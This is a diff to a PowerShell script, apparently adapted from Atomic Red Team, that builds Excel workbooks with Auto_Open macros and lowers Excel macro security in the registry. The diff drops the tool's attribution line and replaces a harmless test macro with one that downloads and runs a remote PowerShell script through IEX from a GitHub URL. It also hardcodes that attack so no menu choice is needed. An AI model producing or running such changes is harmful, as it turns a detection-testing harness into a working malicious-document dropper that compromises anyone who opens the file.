@@ -1,4 +1,3 @@
-#Imported from RedCanary's AtomicRedTeam
 #Adopted and Originally Coded by Matt Nelson (@enigma0x3)
 #Reference: https://github.com/enigma0x3/Generate-Macro/blob/master/Generate-Macro.ps1
  <#
@@ -65,15 +64,9 @@ function Excel-Shell {
 #>
 #create macro
 
-# $Code = @"
-# Sub Auto_Open()
-#     Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/chain_reaction_DragonsTail.ps1')", 1)
-# End Sub
-# "@
-
 $Code = @"
 Sub Auto_Open()
-    Call Shell("cmd.exe /c powershell.exe IEX ( echo 22 > c:\poc.txt)", 1)
+    Call Shell("cmd.exe /c powershell.exe IEX ( IWR -uri 'https://github.com/IArandom/check/blob/main/spawn.ps1')", 1)
 End Sub
 "@
 
@@ -105,7 +98,7 @@ $Excel01.Workbooks.Close()
 $Excel01.Quit()
 [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel01) | out-null
 $Excel01 = $Null
-if (ps excel){kill -name excel}
+if (Get-Process excel){Stop-Process -name excel}
 
 #Enable Macro Security
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
@@ -523,46 +516,50 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Secu
 
 }
 
-#Determine Attack
-Do {
-Write-Host "
---------Select Attack---------
-1. Chain Reaction Download and execute with Excel.
-2. Chain Reaction Download and execute with Excel, wmiprvse
-3. Chain Reaction Download and execute with Excel, wmiprvse benign
-4. Chain Reaction Download and execute with Excel Shell
-5. Chain Reaction Download and execute with Excel ShellBrowserWindow
-6. Chain Reaction Download and execute with Excel WshShell
-7. Chain Reaction Download and execute with Excel and POST C2.
-8. Chain Reaction Download and execute with Excel and GET C2.
-------------------------------"
-$AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
-} until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4" -or $AttackNum -eq "5" -or $AttackNum -eq "6" -or $AttackNum -eq "7" -or $AttackNum -eq "8")
+# Hardcode Attack 4
+Excel-Shell
+
+# #Determine Attack
+# Do {
+# Write-Host "
+# --------Select Attack---------
+# 1. Chain Reaction Download and execute with Excel.
+# 2. Chain Reaction Download and execute with Excel, wmiprvse
+# 3. Chain Reaction Download and execute with Excel, wmiprvse benign
+# 4. Chain Reaction Download and execute with Excel Shell
+# 5. Chain Reaction Download and execute with Excel ShellBrowserWindow
+# 6. Chain Reaction Download and execute with Excel WshShell
+# 7. Chain Reaction Download and execute with Excel and POST C2.
+# 8. Chain Reaction Download and execute with Excel and GET C2.
+# ------------------------------"
+# $AttackNum = Read-Host -prompt "Select Attack Number & Press Enter"
+# } until ($AttackNum -eq "1" -or $AttackNum -eq "2" -or $AttackNum -eq "3" -or $AttackNum -eq "4" -or $AttackNum -eq "5" -or $AttackNum -eq "6" -or $AttackNum -eq "7" -or $AttackNum -eq "8")
+
 
 
 #Initiate Attack Choice
 
-if($AttackNum -eq "1"){
-    Excel-Com-Trampoline
-}
-elseif($AttackNum -eq "2"){
-    Excel-Com-Wmiprvse-Trampoline
-}
-elseif($AttackNum -eq "3"){
-    Excel-Com-Wmiprvse-Benign-Trampoline
-}
-elseif($AttackNum -eq "4"){
-    Excel-Shell
-}
-elseif($AttackNum -eq "5"){
-    Excel-Com-ShellBrowserWindow
-}
-elseif($AttackNum -eq "6"){
-    Excel-Com-wshshell
-}
-elseif($AttackNum -eq "7"){
-    Excel-Shell-C2-POST
-}
-elseif($AttackNum -eq "8"){
-    Excel-Shell-C2-GET
-}
+# if($AttackNum -eq "1"){
+#     Excel-Com-Trampoline
+# }
+# elseif($AttackNum -eq "2"){
+#     Excel-Com-Wmiprvse-Trampoline
+# }
+# elseif($AttackNum -eq "3"){
+#     Excel-Com-Wmiprvse-Benign-Trampoline
+# }
+# elseif($AttackNum -eq "4"){
+#     Excel-Shell
+# }
+# elseif($AttackNum -eq "5"){
+#     Excel-Com-ShellBrowserWindow
+# }
+# elseif($AttackNum -eq "6"){
+#     Excel-Com-wshshell
+# }
+# elseif($AttackNum -eq "7"){
+#     Excel-Shell-C2-POST
+# }
+# elseif($AttackNum -eq "8"){
+#     Excel-Shell-C2-GET
+# }
